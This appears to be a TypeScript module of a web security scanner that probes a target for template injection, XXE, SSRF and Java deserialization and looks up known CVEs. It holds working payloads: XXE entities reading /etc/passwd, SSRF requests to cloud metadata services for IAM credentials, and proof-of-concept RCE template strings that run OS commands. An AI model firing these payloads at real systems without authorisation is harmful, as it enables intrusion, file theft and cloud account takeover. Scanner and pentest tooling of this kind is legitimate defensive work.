/**
 * Advanced Vulnerability Probes
 *
 * Non-destructive, evidence-gathering checks for:
 *   • SSTI  — Server-Side Template Injection (Jinja2, Twig, Freemarker, EL, ERB, Spring)
 *   • XXE   — XML External Entity injection via content-type probing
 *   • SSRF  — Server-Side Request Forgery via redirect parameters
 *   • Deser — Deserialization endpoint detection
 *   • CVE   — NVD API cross-reference for detected technology versions
 */

import type { RealFinding } from "./scanner";
import type { Target, LogFn } from "./scanner";

const ts = () => new Date().toISOString();

async function probe(
  url: string,
  opts: { method?: string; headers?: Record<string, string>; body?: string; timeoutMs?: number; followRedirects?: boolean } = {},
): Promise<{ status: number; headers: Record<string, string>; body: string } | null> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), opts.timeoutMs ?? 10_000);
  try {
    const res = await fetch(url, {
      method: opts.method ?? "GET",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; SentinelX/2.0; security-scanner)", ...(opts.headers ?? {}) },
      body: opts.body,
      signal: controller.signal,
      redirect: opts.followRedirects === false ? "manual" : "follow",
    });
    const headers: Record<string, string> = {};
    res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
    let body = "";
    try { body = await res.text(); } catch { /* ignore */ }
    return { status: res.status, headers, body: body.slice(0, 15_000) };
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SSTI — Server-Side Template Injection
// ═══════════════════════════════════════════════════════════════════════════════

const SSTI_PAYLOADS: { payload: string; math: string; result: string; engine: string }[] = [
  { payload: "{{7*7}}",            math: "7*7",  result: "49",   engine: "Jinja2 / Twig" },
  { payload: "${7*7}",             math: "7*7",  result: "49",   engine: "Freemarker / EL" },
  { payload: "<%= 7*7 %>",         math: "7*7",  result: "49",   engine: "ERB (Ruby)" },
  { payload: "#{7*7}",             math: "7*7",  result: "49",   engine: "Ruby / Mako" },
  { payload: "*{7*7}",             math: "7*7",  result: "49",   engine: "Spring Expression Language" },
  { payload: "${7*'7'}",           math: "7*'7'",result: "7777777", engine: "Jinja2" },
  { payload: "{{7*'7'}}",          math: "7*'7'",result: "49",   engine: "Twig (strict)" },
  { payload: "{% print(7*7) %}",   math: "7*7",  result: "49",   engine: "Jinja2 print" },
  { payload: "${7+7}",             math: "7+7",  result: "14",   engine: "EL / Thymeleaf" },
  { payload: "{{7+7}}",            math: "7+7",  result: "14",   engine: "Jinja2 / Handlebars" },
];

const SSTI_TEST_PARAMS = [
  "q", "search", "query", "name", "input", "template", "msg", "message",
  "text", "content", "title", "value", "data", "label", "subject",
  "error", "info", "desc", "description", "body", "page", "view",
];

export async function checkSSTI(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing Server-Side Template Injection (SSTI)...`);

  for (const param of SSTI_TEST_PARAMS.slice(0, 8)) {
    for (const { payload, result, engine, math } of SSTI_PAYLOADS) {
      const testUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
      const r = await probe(testUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      if (r.body.includes(result) && !r.body.includes(payload)) {
        // Confirmed: the expression was evaluated
        const rce_payload = engine.includes("Jinja2") ? `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` :
                            engine.includes("ERB")    ? `<%= \`id\` %>` :
                            engine.includes("Freemarker") ? `${"{\"freemarker.template.utility.Execute\"?new()?(\"id\")}"}`  :
                            `{{7*7}} — manual RCE escalation required`;
        findings.push({
          title: `SSTI — Server-Side Template Injection (${engine})`,
          severity: "critical",
          cvss: 9.8,
          cve: null,
          description: `Server-Side Template Injection confirmed in parameter '${param}'. The expression ${payload} evaluated to ${result} (${math}), proving the template engine (${engine}) executed attacker-controlled code. SSTI routinely escalates to Remote Code Execution (RCE) — an attacker can execute arbitrary OS commands as the web server user.`,
          evidence: `REQUEST:  GET ${testUrl}\nPAYLOAD:  ${param}=${payload}\nEXPECTED: expression evaluates to "${result}"\nRESPONSE: HTTP ${r.status} — found "${result}" in body (expression was evaluated)\nTEMPLATE ENGINE: ${engine}\n\nPROOF-OF-CONCEPT RCE payload:\n${rce_payload}`,
          remediation: `1. Never pass user input into template render() calls.\n2. Use a template sandbox (e.g. Jinja2 SandboxedEnvironment).\n3. If parameter '${param}' must contain user content, escape it before rendering: {{ content | e }}\n4. Disable eval and code execution within templates in production.\n5. Run the web server as a least-privilege user and apply seccomp/AppArmor.`,
        });
        await onLog(`[${ts()}] ⚠ SSTI CONFIRMED: ${engine} via param '${param}' — ${payload} → ${result}`);
        return findings; // one confirmed is sufficient
      }
    }
  }

  await onLog(`[${ts()}] SSTI: no evaluation detected`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// XXE — XML External Entity
// ═══════════════════════════════════════════════════════════════════════════════

const XXE_PAYLOADS = [
  `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>`,
];

const XXE_INDICATORS = [
  "root:", "daemon:", "/bin/bash", "/bin/sh", // /etc/passwd
  "nobody:", "www-data:", // common linux users
];

export async function checkXXE(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing XXE (XML External Entity) injection...`);

  const xmlEndpoints = [
    target.url,
    `${target.url.replace(/\/$/, "")}/api`,
    `${target.url.replace(/\/$/, "")}/upload`,
    `${target.url.replace(/\/$/, "")}/xml`,
    `${target.url.replace(/\/$/, "")}/soap`,
    `${target.url.replace(/\/$/, "")}/service`,
  ];

  for (const ep of xmlEndpoints.slice(0, 3)) {
    for (const payload of XXE_PAYLOADS) {
      const r = await probe(ep, {
        method: "POST",
        headers: { "Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*" },
        body: payload,
        timeoutMs: 8_000,
      });
      if (!r) continue;

      const indicator = XXE_INDICATORS.find(ind => r.body.includes(ind));
      if (indicator) {
        findings.push({
          title: "XXE — XML External Entity Injection (File Read Confirmed)",
          severity: "critical",
          cvss: 9.1,
          cve: "CVE-2019-20388",
          description: `XXE injection confirmed at ${ep}. The server processed a malicious XML payload referencing an external entity pointing to /etc/passwd. The response body contained system file content ("${indicator}"). This allows reading arbitrary files (including /etc/shadow, SSH keys, application configs), internal SSRF, and potentially remote code execution via expect:// URI handler.`,
          evidence: `REQUEST:\n  POST ${ep}\n  Content-Type: application/xml\n  Body: ${payload.slice(0, 200)}...\n\nRESPONSE:\n  HTTP ${r.status}\n  Body contains: "${indicator}" (from /etc/passwd)\n  Snippet: ${r.body.slice(0, 400)}`,
          remediation: "1. Disable external entity processing in your XML parser (highest priority).\n2. Java: factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false)\n3. PHP: libxml_disable_entity_loader(true) (deprecated) or use DOMDocument with LIBXML_NONET\n4. Python: use defusedxml instead of lxml/ElementTree\n5. Validate and whitelist XML schemas (XSD) before processing.\n6. Apply Content-Type validation — reject application/xml if not needed.",
        });
        await onLog(`[${ts()}] ⚠ XXE CONFIRMED at ${ep} — file read via external entity`);
        return findings;
      }

      // Blind XXE indicator: longer response time or error messages
      if (r.body.toLowerCase().includes("entity") && r.body.toLowerCase().includes("denied")) {
        findings.push({
          title: "Possible Blind XXE — XML Entity Processing Detected",
          severity: "high",
          cvss: 8.1,
          cve: null,
          description: `The server processed the XML body and returned an error referencing entity resolution, suggesting the XML parser attempted to resolve external entities before blocking them. Blind XXE may allow SSRF or out-of-band file exfiltration.`,
          evidence: `POST ${ep}\nContent-Type: application/xml\nResponse indicated entity processing: ${r.body.slice(0, 300)}`,
          remediation: "Disable DTD processing and external entity resolution in your XML parser. Do not rely on error-based blocking alone.",
        });
        break;
      }
    }
  }

  await onLog(`[${ts()}] XXE: no file read confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SSRF — Server-Side Request Forgery (blind, via DNS/HTTP pingback indicators)
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkSSRF(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing SSRF (Server-Side Request Forgery) indicators...`);

  // Check internal metadata service access via redirect parameters
  const metadataUrls = [
    "http://169.254.169.254/latest/meta-data/",  // AWS IMDSv1
    "http://metadata.google.internal/computeMetadata/v1/",  // GCP
    "http://169.254.169.254/metadata/instance",  // Azure
    "http://100.100.100.200/latest/meta-data/",  // Alibaba Cloud
  ];

  const ssrfParams = ["url", "fetch", "proxy", "redirect", "image", "src", "href", "link", "file", "path", "load", "host"];

  for (const param of ssrfParams.slice(0, 5)) {
    for (const metaUrl of metadataUrls.slice(0, 2)) {
      const testUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(metaUrl)}`;
      const r = await probe(testUrl, { timeoutMs: 8_000 });
      if (!r) continue;

      // AWS metadata indicators
      if (r.body.includes("ami-") || r.body.includes("instance-id") || r.body.includes("iam/security-credentials")) {
        findings.push({
          title: "SSRF — AWS Metadata Service Accessible (IMDSv1 Exposed)",
          severity: "critical",
          cvss: 9.8,
          cve: null,
          description: `Server-Side Request Forgery confirmed: the server fetched the AWS EC2 Instance Metadata Service (IMDS) in response to parameter '${param}'. The response contains AWS metadata. This can expose IAM credentials, allowing full AWS account compromise.`,
          evidence: `GET ${testUrl}\nParameter: ${param}=${metaUrl}\nHTTP ${r.status} response contains AWS metadata indicators:\n${r.body.slice(0, 500)}`,
          remediation: "1. Block server-side requests to link-local (169.254.x.x) and metadata IP ranges.\n2. Migrate to IMDSv2 (requires session token — prevents SSRF exploitation).\n3. Validate and allowlist URL parameters that trigger server-side HTTP requests.\n4. Implement egress firewall rules to block access to internal IP ranges from the web server.",
        });
        await onLog(`[${ts()}] ⚠ SSRF CONFIRMED — AWS IMDS accessible via param '${param}'`);
        return findings;
      }

      // GCP metadata indicators
      if (r.body.includes("project-id") || r.body.includes("computeMetadata") || r.body.includes("serviceAccounts")) {
        findings.push({
          title: "SSRF — GCP Metadata Service Accessible",
          severity: "critical",
          cvss: 9.8,
          cve: null,
          description: `SSRF confirmed: GCP Compute Metadata Service accessed via parameter '${param}'. GCP metadata can expose OAuth tokens and service account credentials.`,
          evidence: `GET ${testUrl}\nHTTP ${r.status} response contains GCP metadata:\n${r.body.slice(0, 500)}`,
          remediation: "Block requests to metadata IP ranges (169.254.169.254, metadata.google.internal). Validate all URL-fetching parameters.",
        });
        return findings;
      }
    }
  }

  await onLog(`[${ts()}] SSRF: no metadata service access confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CVE Lookup — NVD API (free, no key required)
// ═══════════════════════════════════════════════════════════════════════════════

interface NvdCve {
  id: string;
  description: string;
  cvssScore: number;
  severity: string;
  published: string;
}

async function queryNvd(keyword: string): Promise<NvdCve[]> {
  try {
    const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=5&cvssV3Severity=HIGH,CRITICAL`;
    const r = await probe(url, { timeoutMs: 15_000 });
    if (!r || r.status !== 200) return [];

    const data = JSON.parse(r.body);
    const vulnerabilities: NvdCve[] = [];

    for (const item of (data.vulnerabilities ?? []).slice(0, 5)) {
      const cve = item.cve;
      const desc = cve?.descriptions?.find((d: any) => d.lang === "en")?.value ?? "";
      const metrics = cve?.metrics?.cvssMetricV31?.[0] ?? cve?.metrics?.cvssMetricV30?.[0] ?? cve?.metrics?.cvssMetricV2?.[0];
      const score = metrics?.cvssData?.baseScore ?? 0;
      const sev = metrics?.cvssData?.baseSeverity ?? "UNKNOWN";

      if (score >= 7.0) {
        vulnerabilities.push({
          id: cve.id,
          description: desc.slice(0, 300),
          cvssScore: score,
          severity: sev,
          published: cve.published?.slice(0, 10) ?? "",
        });
      }
    }
    return vulnerabilities;
  } catch {
    return [];
  }
}

interface TechProfile { name: string; version?: string; category: string; }

export async function lookupCvesForTechs(techs: TechProfile[], onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (techs.length === 0) return findings;

  await onLog(`[${ts()}] Cross-referencing detected technologies against NVD CVE database...`);

  // Deduplicate and pick tech with version info first
  const searchable = techs.filter(t => t.version && /[\d.]/.test(t.version)).slice(0, 4);
  if (searchable.length === 0) {
    // Try without version
    const fallback = techs.filter(t => ["CMS", "Backend Framework", "Web Server"].includes(t.category)).slice(0, 3);
    searchable.push(...fallback);
  }

  for (const tech of searchable) {
    const query = tech.version ? `${tech.name} ${tech.version}` : tech.name;
    await onLog(`[${ts()}] NVD lookup: "${query}"...`);
    const cves = await queryNvd(query);

    if (cves.length > 0) {
      const topCve = cves[0]!;
      const allCveIds = cves.map(c => c.id).join(", ");
      findings.push({
        title: `Known CVE(s) for ${tech.name}${tech.version ? ` ${tech.version}` : ""} — ${topCve.id}`,
        severity: topCve.cvssScore >= 9.0 ? "critical" : topCve.cvssScore >= 7.0 ? "high" : "medium",
        cvss: topCve.cvssScore,
        cve: topCve.id,
        description: `NVD database shows ${cves.length} known high/critical vulnerability(ies) affecting ${tech.name}${tech.version ? ` version ${tech.version}` : ""}. Top finding: ${topCve.description}`,
        evidence: `Detected technology: ${tech.name} ${tech.version ?? "(version unknown)"}\nNVD query: "${query}"\nCVEs found (HIGH/CRITICAL): ${allCveIds}\n\nTop CVE — ${topCve.id} (CVSS ${topCve.cvssScore} ${topCve.severity}):\n${topCve.description}\nPublished: ${topCve.published}\n\nFull details: https://nvd.nist.gov/vuln/detail/${topCve.id}`,
        remediation: `Update ${tech.name} to the latest stable version immediately. Check https://nvd.nist.gov/vuln/search for all known vulnerabilities. Subscribe to the vendor's security advisory list. Apply vendor patches within your SLA window (critical = 24h, high = 7 days).`,
      });
      await onLog(`[${ts()}] CVE match: ${tech.name} ${tech.version ?? ""} — ${allCveIds}`);
    } else {
      await onLog(`[${ts()}] NVD: no critical/high CVEs for "${query}"`);
    }

    // Respect NVD rate limit (5 req / 30s without API key)
    await new Promise(r => setTimeout(r, 700));
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// RCE via Deserialization — detect known deserialization endpoints
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkDeserialization(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Checking for deserialization attack surfaces...`);

  // Java serialized objects start with 0xACED or base64 rO0A
  // Check if endpoints accept these content types
  const deser_endpoints = [
    { path: "/", ct: "application/x-java-serialized-object" },
    { path: "/api", ct: "application/x-java-serialized-object" },
    { path: "/rpc", ct: "application/x-java-serialized-object" },
    { path: "/service", ct: "application/x-java-serialized-object" },
  ];

  for (const ep of deser_endpoints.slice(0, 2)) {
    const url = target.url.replace(/\/$/, "") + (ep.path === "/" ? "" : ep.path);
    const r = await probe(url, {
      method: "POST",
      headers: { "Content-Type": ep.ct },
      body: "\xAC\xED\x00\x05", // Java serialized object magic bytes
      timeoutMs: 6_000,
    });
    if (!r) continue;

    if (r.status !== 400 && r.status !== 415) {
      // Server didn't reject the content type — may be processing it
      const body = r.body.toLowerCase();
      if (body.includes("classnotfound") || body.includes("deserializ") || body.includes("streamcorrupt") || body.includes("aced0005")) {
        findings.push({
          title: "Java Deserialization Endpoint Detected",
          severity: "critical",
          cvss: 9.8,
          cve: "CVE-2015-4852",
          description: `The endpoint ${url} accepts Java serialized object content (application/x-java-serialized-object) and appears to process it. Java deserialization vulnerabilities (CVE-2015-4852, Apache Commons Collections gadget chains) allow unauthenticated RCE. This class of vulnerability was used in major attacks against WebLogic, JBoss, and Jenkins.`,
          evidence: `POST ${url}\nContent-Type: application/x-java-serialized-object\nBody: (Java magic bytes 0xACED 0x0005)\nHTTP ${r.status} — server processed the payload (error contains deserialization context)\nResponse: ${r.body.slice(0, 300)}`,
          remediation: "1. Patch all Java frameworks and libraries (Spring, Apache Commons Collections).\n2. Use serialization filters (Java 9+ ObjectInputFilter) to allowlist safe classes.\n3. Disable Java deserialization completely if not required.\n4. Use RASP (Runtime Application Self-Protection) to detect deserialization attacks.\n5. Monitor for ClassLoader abuse and unusual class loading patterns.",
        });
        await onLog(`[${ts()}] ⚠ DESERIALIZATION endpoint detected at ${url}`);
        break;
      }
    }
  }

  await onLog(`[${ts()}] Deserialization check complete`);
  return findings;
}
